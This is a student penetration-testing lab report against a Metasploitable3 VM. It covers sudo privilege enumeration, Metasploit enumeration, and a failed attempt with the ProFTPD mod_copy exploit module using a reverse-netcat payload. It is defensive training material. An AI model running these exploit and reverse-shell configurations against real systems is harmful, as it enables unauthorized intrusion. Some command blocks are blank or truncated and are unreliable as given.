# Privilege Escalation Assessment

## Project 7: Penetration Testing Lab

**Target:** Metasploitable3 Ubuntu 14.04
**Target IP:** `192.168.56.101`
**Initial User:** `vagrant`
**Assessment Area:** Local Privilege Escalation

---

## 1. Target Session Verification

### Command

```bash
whoami
id
hostname
```

### What it does

* `whoami` identifies the currently authenticated user.
* `id` displays the user's UID, GID, and group memberships.
* `hostname` identifies the system on which the commands are being executed.

### Why we're running it

Before performing privilege-escalation testing, we need to establish the identity and context of the current session. This confirms that the assessment is being performed against the intended Metasploitable3 target rather than the Kali attacker machine.

### Output

```text
whoami
vagrant

id
uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo)

hostname
metasploitable3-ub1404
```

### Screenshot

![Privilege escalation target verification](../screenshots/privilege-escalation-target-verification.png)

**Screenshot:** `privilege-escalation-target-verification.png`

### Finding

The authenticated account is `vagrant` on the `metasploitable3-ub1404` target. The account is a member of the `sudo` group, which indicates that further sudo privilege enumeration is warranted.

---

## 2. Sudo Privilege Enumeration

### Command

```bash
sudo -l
```

### What it does

`sudo -l` lists the commands that the current user is permitted to execute through `sudo`, including any restrictions and authentication requirements.

### Why we're running it

We are checking whether the compromised or authenticated `vagrant` account has permissions that could allow local privilege escalation to root.

### Output

```text
Matching Defaults entries for vagrant on
metasploitable3-ub1404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User vagrant may run the following commands on
metasploitable3-ub1404:
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: ALL
```

### Screenshot

The `sudo -l` output was captured together with the target verification commands:

![Privilege escalation target verification](../screenshots/privilege-escalation-target-verification.png)

**Screenshot:** `privilege-escalation-target-verification.png`

### Finding

The `vagrant` account has unrestricted sudo privileges.

The important entry is:

```text
(ALL : ALL) NOPASSWD: ALL
```

This means the `vagrant` account can execute commands as any user and group, including `root`, without being required to provide a sudo password.

This represents a **critical privilege-escalation weakness** in the intentionally vulnerable lab environment.

---

## 3. Root Privilege Verification

### Command

```bash
sudo whoami
sudo id
```

### What it does

* `sudo whoami` executes `whoami` with elevated privileges and identifies the effective user.
* `sudo id` displays the UID, GID, and group memberships of the elevated process.

### Why we're running it

The previous `sudo -l` enumeration identified unrestricted passwordless sudo access. These commands safely verify whether that permission actually results in root-level execution.

### Output

```text
sudo whoami
root

sudo id
uid=0(root) gid=0(root) groups=0(root)
```

### Screenshot

![Root privilege verification](../screenshots/privilege-escalation-root-verification.png)

**Screenshot:** `privilege-escalation-root-verification.png`

### Finding

The privilege-escalation condition was successfully verified.

The `sudo whoami` command returned:

```text
root
```

and `sudo id` confirmed:

```text
uid=0(root) gid=0(root) groups=0(root)
```

UID `0` represents the root account on Linux. Therefore, the `vagrant` account can successfully execute commands with root privileges without password authentication.

### Security Impact

If an attacker obtains valid access to the `vagrant` account, the unrestricted `NOPASSWD: ALL` configuration allows immediate execution of commands with root privileges.

This results in complete compromise of the operating system and its data within the scope of this lab.

---

---

## Metasploit Framework Validation

The Metasploit Framework was used to supplement the manual privilege-escalation assessment. The framework was configured to maintain information about the authorized Metasploitable3 target and to support structured host, service, vulnerability, and module enumeration.

The Metasploit-based assessment was performed after the direct SSH privilege-escalation verification. The purpose of this phase was not to replace the manual privilege check, but to demonstrate how Metasploit can be used to organize assessment data and identify relevant modules that may support further investigation.

### Database Connectivity Verification

The Metasploit database connection was verified using the `db_status` command.

### Command Used

```text
db_status
```

#### What It Does

The `db_status` command reports the current connection status of the Metasploit Framework database. In this assessment, the database connection was confirmed as active and using PostgreSQL.

Metasploit database connectivity allows assessment information such as hosts, services, vulnerabilities, credentials, and sessions to be stored and queried throughout the engagement.

#### Assessment Significance

A functioning database connection provides a centralized way to track information collected during the assessment. This is particularly useful when multiple enumeration activities are performed against the same target because the discovered information can be associated with the authorized Metasploitable3 host.

#### Evidence

`screenshots/metasploit-db-status.png`

---

### Target Host Registration

The authorized Metasploitable3 target was added to the Metasploit database using the `hosts -a` command.

#### Command Used

```text
hosts -a 192.168.56.101
```
### What It Does

The hosts -a command adds a host to the Metasploit database so that the target can be tracked as an assessment asset.

### Assessment Significance

Registering the target establishes the IP address within Metasploit and allows subsequent service and vulnerability information to be associated with the correct laboratory system.

### Evidence

screenshots/metasploit-host-registration.png

### Metasploit Host Verification

The `hosts` command was used to verify that the authorized Metasploitable3 target had been successfully registered in the Metasploit database.

#### Command Used

```text
hosts
```
### What It Does

The hosts command displays hosts currently stored in the Metasploit database, allowing the assessor to verify that the intended target has been registered.

Finding

The target 192.168.56.101 was successfully displayed in the Metasploit host database.

Assessment Significance

This confirms that the intended Metasploitable3 laboratory system is registered in Metasploit and can be associated with subsequent service and vulnerability information.

### Evidence

screenshots/metasploit-hosts-list.png

### Metasploit Service Inventory

The `services` command was used to query the Metasploit database for network services associated with the registered Metasploitable3 target.

#### Command Used

```text
services
```
### What It Does

The services command displays service information stored in the Metasploit database. The results can include the target host, port number, protocol, service name, state, and additional service information.

### Why We're Running It

After confirming that the target was registered in the Metasploit database, the next step was to determine which network services had been recorded for that host.

This provides a structured service inventory that can be used to support further assessment and module research.

### Finding

The Metasploit database displayed the services associated with the registered target.

The service information corresponds with the services identified during the earlier network-scanning phase, including FTP, SSH, HTTP, SMB, IPP, MySQL, and Jetty-based HTTP services.

Assessment Significance

The service inventory provides a framework-based view of the target's exposed attack surface. It also demonstrates that information collected through Metasploit can be queried after being stored in the database.

### Evidence

screenshots/metasploit-services-initial.png

### Metasploit Service and Version Discovery

The `db_nmap` command was used to perform Nmap service and version detection through the Metasploit Framework while recording the results in the Metasploit database.

#### Command Used

```text
db_nmap -sV 192.168.56.101
```
### What It Does

db_nmap allows Nmap to be executed from within Metasploit while automatically importing the scan results into the Metasploit database.

The -sV option enables service and version detection. Rather than identifying only whether a port is open, this scan attempts to determine the service running on each discovered port and, where possible, its software version.

### Why We're Running It

The earlier assessment established the target's exposed services using Nmap. Running the service/version scan through Metasploit provides an additional verification and imports the results directly into the Metasploit database.

This is useful because the discovered services can subsequently be queried within Metasploit and used to guide module research.

### Findings

The scan identified the following services on the authorized Metasploitable3 target:

Port	Service	Version
21/tcp	FTP	ProFTPD 1.3.5
22/tcp	SSH	OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
80/tcp	HTTP	Apache httpd 2.4.7
445/tcp	SMB	Samba smbd 3.X - 4.X
631/tcp	IPP	CUPS 1.7
3306/tcp	MySQL	MySQL (unauthorized)
8080/tcp	HTTP	Jetty 8.1.7.v20120910

The target was identified as:

METASPLOITABLE3-UB1404

The service information identified the system as a Unix/Linux host.

Assessment Significance

The results provide a detailed service inventory within the Metasploit database. Version information is particularly useful during penetration testing because specific software versions can be compared against known vulnerabilities and relevant Metasploit modules.

However, service/version detection alone does not prove that a particular vulnerability is exploitable. Any potential vulnerability identified from version information should be manually validated before being classified as confirmed.

Tool Output Note

The scan completed successfully and reported the discovered services. A Ruby regular-expression warning from the Metasploit recog component was also displayed after the scan. This warning did not prevent the Nmap scan from completing or the service results from being recorded.

Evidence

screenshots/metasploit-db-nmap-service-scan.png

### Metasploit Vulnerability Database Review

The Metasploit vulnerability database was queried using the `vulns` command to determine whether any vulnerability records had been associated with the registered Metasploitable3 target.

#### Command Used

```text
vulns
```
### What It Does

The vulns command displays vulnerability information currently stored in the Metasploit database. When vulnerability records are available, the output can include the affected host, service, vulnerability name, timestamp, resource, and associated references.

### Why We're Running It

The purpose of this check was to determine whether the information already collected through Metasploit had resulted in vulnerability records being associated with the target.

This provides a useful distinction between vulnerabilities identified during scanning and vulnerabilities that have actually been imported or recorded in the Metasploit database.

### Output

The command returned an empty vulnerability table:

# Vulnerabilities

Timestamp  Host  Service  Resource  Name  References

No vulnerability records were displayed.

### Finding

The empty result indicates that no vulnerability records were currently associated with 192.168.56.101 in the Metasploit vulnerability database at the time of the assessment.

This does not mean that the Metasploitable3 system has no vulnerabilities. The target is intentionally vulnerable, and vulnerabilities were identified during the earlier Nmap vulnerability-assessment phase.

Instead, the result indicates that those findings were not currently represented as vulnerability records in the Metasploit database.

### Assessment Significance

This demonstrates an important distinction between vulnerability discovery and vulnerability database registration. A scanner may identify potential vulnerabilities without those findings automatically appearing in Metasploit's vulns database.

Therefore, the empty vulns result was treated as a database-state observation rather than evidence that the target was secure.

### Evidence

screenshots/metasploit-vulns-empty.png

### Metasploit Sudo Module Research

After the direct SSH assessment confirmed that the `vagrant` account possessed unrestricted sudo privileges, the Metasploit module database was queried for sudo-related modules.

#### Command Used

```text
search
```
### What It Does

The search sudo command searches the Metasploit module database for modules whose names or descriptions contain the term sudo.

The results can include exploit modules, post-exploitation modules, payloads, and other supporting modules related to sudo or privilege escalation.

### Why We're Running It

The purpose of this search was to determine whether Metasploit contains modules relevant to sudo-based privilege escalation.

This provides supporting evidence that the Framework can be used to research potential privilege-escalation techniques after an elevated-privilege condition has been identified during manual enumeration.

### Findings

The search returned multiple sudo-related modules. One relevant result was:

post/multi/manage/sudo

The search also returned other modules associated with sudo or privilege escalation, including modules targeting specific Linux applications and platforms.

Important Validation Note

The presence of a module in the search sudo results does not by itself demonstrate that the module is applicable to the Metasploitable3 target.

The actual privilege-escalation finding was established independently through direct enumeration of the target:

sudo -l

which returned:

(ALL : ALL) NOPASSWD: ALL

Root-level execution was then verified with:

sudo whoami
sudo id

Therefore, the Metasploit module search is supporting evidence demonstrating module discovery and research capability, while the direct SSH commands provide the actual proof of successful privilege escalation.

### Assessment Significance

This step demonstrates the complementary roles of manual enumeration and exploitation frameworks.

Manual enumeration identified the exact sudo configuration present on the target, while Metasploit provided a structured mechanism for researching modules that may be relevant to sudo-based privilege escalation.

The assessment therefore did not rely solely on an automated module search to declare the vulnerability confirmed.

### Evidence

screenshots/metasploit-sudo-module-search.png

screenshots/metasploit-sudo-module-search2.png

screenshots/metasploit-sudo-module-search3.png

screenshots/metasploit-sudo-module-search4.png

## Privilege Escalation Summary

| Test                         | Result                      | Significance                                   |
| ---------------------------- | --------------------------- | ---------------------------------------------- |
| Target identity verification | Confirmed `vagrant`         | Established initial access context             |
| Group enumeration            | `vagrant` belongs to `sudo` | Indicates elevated privileges may be available |
| `sudo -l`                    | `NOPASSWD: ALL`             | Unrestricted sudo access identified            |
| `sudo whoami`                | `root`                      | Root execution confirmed                       |
| `sudo id`                    | `uid=0(root)`               | Root-level privileges technically verified     |

### Overall Finding

**Critical — Unrestricted Passwordless Sudo Privileges**

The `vagrant` account has unrestricted passwordless sudo permissions, allowing commands to be executed as root. This provides a direct privilege-escalation path from the `vagrant` account to full system-level privileges.

---

## Evidence Files

* `screenshots/privilege-escalation-target-verification.png`
* `screenshots/privilege-escalation-root-verification.png`

## Assessment Note

All privilege-escalation testing documented in this report was performed against the intentionally vulnerable Metasploitable3 laboratory environment.

## Exploitation and Initial Access

### ProFTPD Module Discovery

The previously identified FTP service was ProFTPD 1.3.5 running on TCP port 21. Metasploit was queried for modules associated with the identified ProFTPD service.

#### Command Used

```text
search proftpd
```
### What It Does

The search command queries the Metasploit module database for modules matching the supplied search terms. In this case, proftpd modcopy narrows the search toward modules associated with ProFTPD's mod_copy functionality.

### Why We're Running It

The service enumeration phase identified ProFTPD 1.3.5 on the target. Module discovery is therefore being performed against a previously identified service rather than selecting an exploit arbitrarily.

### Assessment Significance

This step connects the vulnerability/service-enumeration phase with the exploitation phase. The presence of a matching Metasploit module does not by itself prove that the target is exploitable; exploitation must still be validated against the authorized laboratory target.

Evidence

screenshots/metasploit-proftpd-module-search.png
#### Evidence

`screenshots/metasploit-proftpd-module-search.png`

---

### ProFTPD Exploit Module Configuration Review

After identifying a matching ProFTPD module, the module was loaded without immediately executing it. The available module and payload options were reviewed first to understand the configuration requirements and to ensure that the exploitation attempt would be performed against the intended laboratory target.

#### Command Used

```text
use exploit/unix/ftp/proftpd_modcopy_exec
show
```
### What It Does

The use command selects the exploit/unix/ftp/proftpd_modcopy_exec module.

The show options command displays the configuration parameters required by the module, optional parameters, payload settings, and the exploitation target.

When the module was loaded, Metasploit automatically selected:

cmd/unix/reverse_netcat

as the default payload because no payload had been explicitly configured.

Why We're Running It

The earlier enumeration identified ProFTPD 1.3.5 on TCP port 21. The selected module specifically identifies ProFTPD 1.3.5 as its exploitation target.

Reviewing the module configuration before execution allows the assessment to establish whether the module's requirements correspond to the services and network configuration already identified on the Metasploitable3 target.

This also prevents the exploitation attempt from being performed with an incorrect target address, FTP port, HTTP port, or reverse-payload configuration.

Module Options Identified
Option	Current Setting	Purpose
RHOSTS	Not configured	Specifies the remote target host
RPORT_FTP	21	Specifies the ProFTPD FTP service
RPORT	80	Specifies the HTTP service used by the module
SITEPATH	/var/www	Specifies the expected writable website path
TARGETURI	/	Specifies the base web path
TMPPATH	/tmp	Specifies the temporary filesystem location
LHOST	10.0.2.15	Local address for the reverse payload
LPORT	4444	Local listening port for the reverse payload
Exploit Target

The module reported:

Exploit target:

0   ProFTPD 1.3.5

This is significant because it corresponds directly with the ProFTPD version identified during the earlier service enumeration phase.

The match provides a technically justified reason to investigate this module against the authorized Metasploitable3 laboratory target.

However, identifying a matching module does not by itself prove that the target is exploitable. Successful exploitation must still be validated against the target.

Payload Analysis

The selected payload was:

cmd/unix/reverse_netcat

A reverse payload causes the target to initiate a connection back toward the assessment machine after successful exploitation.

The LHOST value determines the local address that receives the connection, while LPORT determines the TCP port used for that connection.

Because the displayed LHOST value was 10.0.2.15, its suitability for the current 192.168.56.0/24 laboratory network must be verified before execution.

### Assessment Significance

The module review establishes a clear relationship between the previous reconnaissance findings and the exploitation phase:

Service Enumeration
        ↓
ProFTPD 1.3.5 identified on TCP/21
        ↓
Metasploit module search
        ↓
ProFTPD mod_copy module identified
        ↓
Module configuration reviewed
        ↓
Network and payload configuration validated
        ↓
Exploitation validation

This methodology ensures that exploitation is based on an identified service and version rather than an arbitrary module selection.

#### Evidence

The Metasploit module information and configuration review were captured in the following screenshots:

- `screenshots/metasploit-proftpd-module-info1.png`
- `screenshots/metasploit-proftpd-module-info2.png`
- `screenshots/metasploit-proftpd-module-info3.png`
- `screenshots/metasploit-proftpd-show-options1.png`
- `screenshots/metasploit-proftpd-show-options2.png`
---

### Kali Network Interface Verification

Before configuring the reverse payload, the network interfaces on the Kali assessment machine were examined to identify the local address that is reachable from the Metasploitable3 target.

#### Command Used

```text
ip
```
### What It Does

The ip addr command displays the network interfaces and their assigned IP addresses on the local Kali system.

This information is important when configuring a reverse payload because the target must be able to establish a connection back to the correct interface on the assessment machine.

Relevant Interface

The assessment machine has multiple network interfaces. The interface used for communication with the Metasploitable3 laboratory network was identified as:

eth1
inet 192.168.56.103/24

The Metasploitable3 target is:

192.168.56.101

Both systems therefore reside on the 192.168.56.0/24 laboratory network.

The Kali system also has an eth0 address of 10.0.2.15. Although this address is valid on the Kali system, it belongs to a different network and is not the appropriate address for the reverse connection in this laboratory configuration.

### Assessment Significance

The interface verification established that 192.168.56.103 is the appropriate local address for the reverse payload.

The network relationship is:

Kali
192.168.56.103
     |
     | 192.168.56.0/24
     |
Metasploitable3
192.168.56.101

Therefore, the reverse payload should use:

LHOST = 192.168.56.103
Evidence
screenshots/metasploit-kali-network-interface1.png
screenshots/metasploit-kali-network-interface2.png
Reverse Payload LHOST Configuration

After identifying the correct Kali interface, the Metasploit module was configured to use the reachable laboratory network address for the reverse payload.

Command Used
set LHOST 192.168.56.103
What It Does

The set LHOST command changes the local host address used by the configured reverse payload.

In this assessment, LHOST was changed from the automatically displayed 10.0.2.15 address to 192.168.56.103, which is the Kali interface connected to the same laboratory network as the Metasploitable3 target.

### Why We're Running It

A reverse payload must connect back to an address reachable from the target. Using the correct laboratory interface ensures that the payload is configured for the intended assessment network rather than an unrelated interface.

Verification

The module configuration was reviewed after changing LHOST:

show options

The expected configuration should display:

LHOST    192.168.56.103
LPORT    4444
Assessment Significance

Changing LHOST does not itself establish successful exploitation. It only prepares the reverse payload to communicate with the assessment machine if the exploitation attempt succeeds.

The configuration was therefore verified before proceeding to the exploitation stage.

### Evidence

screenshots/metasploit-proftpd-lhost-configured1.png
screenshots/metasploit-proftpd-lhost-configured2.
---

### ProFTPD Module Information Review

Before attempting exploitation, the selected Metasploit module was reviewed using the `info` command. This provided additional technical information about the module and its intended exploitation target.

#### Command Used

```text

```
### What It Does

The info command displays detailed information about the currently selected Metasploit module. This can include the module description, affected software, references, disclosure information, available targets, payload information, and module-specific technical details.

### Why We're Running It

The module was selected because the earlier service enumeration identified ProFTPD 1.3.5 on the target. Reviewing the module information provides additional context before execution and helps confirm that the selected module is appropriate for the identified service.

This is also an important validation step because finding a module through search does not automatically establish that the target is exploitable.

### Assessment Significance

The module information provides additional technical context for the proposed exploitation path and supports the assessment methodology of validating the selected module before execution.

The exploitation decision is therefore based on the previously identified ProFTPD service and version rather than an arbitrary module selection.

### Evidence
screenshots/metasploit-proftpd-module-info1.png
screenshots/metasploit-proftpd-module-info2.png
screenshots/metasploit-proftpd-module-info3.png
Pre-Exploitation Configuration Review

At this stage, the assessment has established the following:

Item	Verified Value
Target	192.168.56.101
FTP service	ProFTPD
FTP port	21
Target version	ProFTPD 1.3.5
HTTP port	80
Kali laboratory interface	192.168.56.103
LHOST	192.168.56.103
LPORT	4444
Metasploit module	exploit/unix/ftp/proftpd_modcopy_exec
Module target	ProFTPD 1.3.5

The configuration has been reviewed before execution, and the target and local laboratory network have been explicitly identified.
---
---

### Pre-Exploitation Configuration Validation

A final configuration review was performed before attempting exploitation. The initial review showed that the required `RHOSTS` value had not yet been configured and that the reverse payload was still displaying the default `LHOST` value of `10.0.2.15`.

Because the target is located on the `192.168.56.0/24` laboratory network and the Kali assessment interface on that network is `192.168.56.103`, the module configuration was corrected before proceeding.

#### Commands Used

```text
set RHOSTS 192.168.56.101
set LHOST 192.168.56.103
show options
Configuration Requirements
Parameter	Required Configuration	Purpose
RHOSTS	192.168.56.101	Authorized Metasploitable3 target
RPORT	80	Target HTTP service
RPORT_FTP	21	Target ProFTPD FTP service
SITEPATH	/var/www	Website filesystem path used by the module
TARGETURI	/	Base HTTP path
TMPPATH	/tmp	Temporary target filesystem path
LHOST	192.168.56.103	Kali address reachable from the target
LPORT	4444	Reverse payload listening port
Why We're Running It

The final configuration check prevents an exploitation attempt from being directed at the wrong host or configured with an unreachable reverse-payload address.

This is particularly important because the module initially displayed 10.0.2.15 as LHOST, while the authorized Metasploitable3 target communicates with Kali over the 192.168.56.0/24 laboratory network.

Assessment Significance

The final configuration must identify both sides of the assessment connection correctly:

Kali
192.168.56.103
       |
       | 192.168.56.0/24
       |
Metasploitable3
192.168.56.101

Only after RHOSTS and LHOST have been explicitly configured and verified should the assessment proceed to exploitation validation.

### Evidence

screenshots/metasploit-proftpd-pre-exploit-options1.png
screenshots/metasploit-proftpd-pre-exploit-options2.png
---

### Pre-Exploitation Vulnerability Check

Before executing the exploitation module, a non-destructive vulnerability check was performed against the authorized Metasploitable3 target.

#### Command Used

```text
check

RHOSTS and LHOST configured
        ↓
Vulnerability check performed
        ↓
Target appears vulnerable
        ↓
Unauthenticated SITE CPFR confirmed

At this point, the target has passed the module's vulnerability check and the exploitation attempt can be considered as the next phase of the authorized laboratory assessment.

The vulnerability check itself did not establish root privileges or successful command execution. Those outcomes must be validated separately after exploitation.

### Evidence

screenshots/metasploit-proftpd-check.png
---

### ProFTPD Exploitation Attempt

After the target passed the Metasploit vulnerability check, an exploitation attempt was performed against the authorized Metasploitable3 laboratory target.

#### Command Used

```text
exploit
```
What It Does

The exploit command instructs Metasploit to execute the selected proftpd_modcopy_exec module using the configured target, module options, and reverse payload.

The module was configured to target the Metasploitable3 host at 192.168.56.101 and use the Kali laboratory interface at 192.168.56.103 for the reverse connection.

Exploitation Output
[*] Started reverse TCP handler on 192.168.56.103:4444
[*] 192.168.56.101:80 - 192.168.56.101:21 - Connected to FTP server
[*] 192.168.56.101:80 - 192.168.56.101:21 - Sending copy commands to FTP server
[-] 192.168.56.101:80 - Exploit aborted due to failure: unknown: 192.168.56.101:21 - Failure copying PHP payload to website path, directory not writable?
[*] Exploit completed, but no session was created.
What Happened

The exploitation attempt successfully started the reverse TCP handler on the Kali assessment machine and connected to the target's FTP service.

The module then attempted to send its file-copy commands to the ProFTPD service. However, the PHP payload could not be copied to the configured website path.

Metasploit reported:

Failure copying PHP payload to website path, directory not writable?

The module subsequently reported:

Exploit completed, but no session was created.
Finding

The exploitation attempt did not result in a session.

This distinction is important because the previous check command reported that the target appeared vulnerable and confirmed successful use of the unauthenticated SITE CPFR command. However, the actual exploitation attempt could not complete the payload deployment stage.

The evidence therefore supports the following sequence:

ProFTPD 1.3.5 identified
        ↓
Matching Metasploit module selected
        ↓
Target configuration verified
        ↓
Vulnerability check passed
        ↓
Unauthenticated SITE CPFR confirmed
        ↓
Exploitation attempted
        ↓
PHP payload copy failed
        ↓
No session created
Security Interpretation

The vulnerability check demonstrates that the target exposes functionality associated with the selected ProFTPD exploitation technique. However, this assessment did not demonstrate successful remote code execution through the proftpd_modcopy_exec module.

The failure was reported at the payload-copy stage, with Metasploit indicating that the configured website path may not have been writable.

Therefore, the report does not classify this particular exploitation attempt as successful compromise.

Assessment Significance

This result demonstrates why vulnerability identification and exploitation validation are separate stages of a penetration test.

A system may exhibit behavior that causes a vulnerability check to report a positive result while the complete exploitation chain fails because of environmental conditions, filesystem permissions, configuration, payload deployment, or other prerequisites.

In this case, the vulnerability check succeeded, but the exploitation attempt did not produce a session.

Evidence

screenshots/metasploit-proftpd-exploit-failed.png
---

### Session Validation

After the exploitation attempt completed, the Metasploit session table was checked to determine whether an active command or shell session had been established.

#### Command Used

```text
sessions
```
What It Does

The sessions command displays active sessions established by Metasploit modules.

Why We're Running It

The exploitation output reported that no session was created. Checking the session table provides direct evidence that the exploitation attempt did not establish an interactive session on the target.

Finding

No active Metasploit sessions were present.

This confirms that the proftpd_modcopy_exec exploitation attempt did not establish an interactive session on the Metasploitable3 target.

The assessment therefore records the following results:

Assessment Stage	Result
ProFTPD version identification	Confirmed
Matching Metasploit module	Identified
Module configuration	Verified
Vulnerability check	Passed
Exploitation attempt	Performed
Payload deployment	Failed
Metasploit session	Not established
Root compromise through this exploit	Not demonstrated
Assessment Significance

The vulnerability check and the exploitation attempt produced different outcomes. The check indicated that the target appeared vulnerable and that the unauthenticated SITE CPFR operation was successful. However, the subsequent exploitation attempt failed during payload deployment and did not create a session.

Therefore, this evidence should not be presented as a successful remote-code-execution compromise. It demonstrates vulnerability exposure and a failed exploitation attempt within the authorized laboratory environment.

Evidence

screenshots/metasploit-proftpd-sessions.png
